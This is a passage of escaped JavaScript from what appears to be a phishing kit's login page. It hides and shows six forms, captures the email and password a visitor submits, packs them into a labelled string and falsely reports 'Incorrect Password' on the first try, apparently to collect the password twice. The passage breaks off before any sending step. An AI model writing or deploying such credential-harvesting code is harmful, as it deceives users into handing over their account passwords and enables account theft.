hide");\x0a        });\x0a\x0a        closeBtn3.addEventListener("click", () => {\x0a             form3.classList.add("hide");\x0a        });\x0a\x0a         closeBtn4.addEventListener("click", () => {\x0a             form4.classList.add("hide");\x0a        });\x0a\x0a        closeBtn5.addEventListener("click", () => {\x0a             form5.classList.add("hide");\x0a        });\x0a\x0a         closeBtn6.addEventListener("click", () => {\x0a             form6.classList.add("hide");\x0a        });\x0a\x0a\x0a        btnClose1.addEventListener("click", () => {\x0a             form1.classList.add("hide");\x0a        });\x0a\x0a           btnClose2.addEventListener("click", () => {\x0a             form2.classList.add("hide");\x0a        });\x0a\x0a        btnClose3.addEventListener("click", () => {\x0a             form3.classList.add("hide");\x0a        });\x0a\x0a         btnClose4.addEventListener("click", () => {\x0a             form4.classList.add("hide");\x0a        });\x0a\x0a        btnClose5.addEventListener("click", () => {\x0a             form5.classList.add("hide");\x0a        });\x0a\x0a        btnClose6.addEventListener("click", () => {\x0a             form6.classList.add("hide");\x0a        });\x0a\x0a\x0a        formData1.addEventListener("submit", (e) => {\x0a            e.preventDefault();\x0a              \x0a            const email = e.target.elements.email.value;\x0a            const pass = e.target.elements.pass.value;\x0a        \x0a\x0a            if(email === ""){\x0a                errorMsg1.textContent = "Please enter email Address";\x0a            }\x0a\x0a            else if(pass === ""){\x0a                errorMsg1.textContent = "Please enter Email Password";\x0a            }\x0a            else {\x0a                num++;\x0a                 let fData4 = `Email Address\: ${email} \\nPassword\: ${pass}`;\x0a                \x0a                if(num === 1){\x0a                    errorMsg1.textContent = "Incorrect Password";\x0a             